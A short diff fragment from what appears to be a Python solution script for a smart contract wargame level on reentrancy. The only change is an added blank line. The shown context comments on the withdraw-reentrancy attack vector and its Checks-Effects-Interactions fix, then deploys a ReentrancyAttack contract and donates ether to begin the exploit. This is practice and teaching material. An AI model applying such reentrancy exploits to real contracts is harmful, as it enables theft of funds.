@@ -14,6 +14,7 @@ def exploit_lv10(contract: Reentrance):
     # Attack vector: Reentrancy on withdraw method
     #   because withdraw uses 'call' that does not revert on failure, no termination condition is needed for the attack
     # Attack prevention: Checks-Effects-Interactions pattern
+    
     print(f"Balance before attack: {contract.balance / 10**18} Eth")
     attacker = ReentrancyAttack.deploy(contract.address)
     attacker.donate(value=1 * 10**18)
